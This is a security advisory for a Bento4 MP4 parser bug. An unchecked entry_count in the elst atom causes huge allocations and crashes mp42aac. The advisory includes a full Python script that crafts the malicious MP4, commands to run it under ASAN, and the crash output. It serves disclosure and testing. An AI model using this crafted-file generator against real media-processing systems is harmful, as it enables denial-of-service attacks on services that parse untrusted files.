## Bug0: Unbounded entry_count in AP4_ElstAtom Constructor Causes Heap Exhaustion and DoS

`AP4_ElstAtom::AP4_ElstAtom()` in `Ap4ElstAtom.cpp` reads `entry_count` from the MP4 stream as a 32-bit unsigned integer with no upper-bound validation before passing it to `AP4_Array<AP4_ElstEntry>::EnsureCapacity()`, which attempts to allocate `entry_count * 20` bytes and causes a fatal allocation failure or heap buffer overflow.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def make_box(box_type, data):
    size = 8 + len(data)
    return struct.pack('>I', size) + box_type + data

def make_full_box(box_type, version, flags, data):
    size = 12 + len(data)
    return struct.pack('>I', size) + box_type + struct.pack('>B', version) + struct.pack('>I', flags)[1:] + data

# ftyp box
ftyp_data = b'mp42' + struct.pack('>I', 0) + b'mp42' + b'isom'
ftyp = make_box(b'ftyp', ftyp_data)

# mvhd (version 0): full box + 100 bytes of zeros
mvhd = make_full_box(b'mvhd', 0, 0, b'\x00' * 100)

# tkhd (version 0): full box + 92 bytes of zeros
tkhd = make_full_box(b'tkhd', 0, 0, b'\x00' * 92)

# elst full box: entry_count=0xFFFFFF00 with no actual entry data following
# 0xFFFFFF00 * 20 bytes per entry ~= 3.4 GB, triggering std::bad_alloc on 64-bit
elst_data = struct.pack('>I', 0xFFFFFF00)
elst = make_full_box(b'elst', 0, 0, elst_data)

# edts container box containing elst
edts = make_box(b'edts', elst)

# trak container box containing tkhd + edts
trak = make_box(b'trak', tkhd + edts)

# moov container box containing mvhd + trak
moov = make_box(b'moov', mvhd + trak)

# Final MP4 file
mp4 = ftyp + moov

with open('poc_input.mp4', 'wb') as f:
    f.write(mp4)

print(f"Written {len(mp4)} bytes to poc_input.mp4")
print(f"elst entry_count = 0xFFFFFF00 ({0xFFFFFF00})")
print(f"Expected allocation: 0xFFFFFF00 * 20 = {0xFFFFFF00 * 20} bytes (~{0xFFFFFF00 * 20 / (1024**3):.1f} GB)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ==ERROR: AddressSanitizer failed to allocate 0xdfff0001000 (15392894357504) bytes at address 2008fff7000 (errno: 12). The process aborted unconditionally after ASAN attempted to satisfy the ~15 TB allocation (including shadow memory overhead) for an elst box declaring entry_count=0xFFFFFF00.

### Impact

An attacker can crash any mp42aac process unconditionally by supplying a crafted MP4 file whose elst box declares a large entry_count with no corresponding entry data, constituting a reliable denial of service against all 64-bit deployments. On 32-bit builds the multiplication `entry_count * sizeof(AP4_ElstEntry)` wraps to a small value, causing `EnsureCapacity` to allocate a tiny buffer while leaving `m_AllocatedCount` set to the attacker-controlled count, and subsequent `Append()` calls then write attacker-influenced `AP4_ElstEntry` fields beyond the heap allocation, enabling heap buffer overflow that could potentially lead to arbitrary code execution. The attack surface is any invocation of mp42aac on an untrusted MP4 file, requiring no authentication or special privileges.
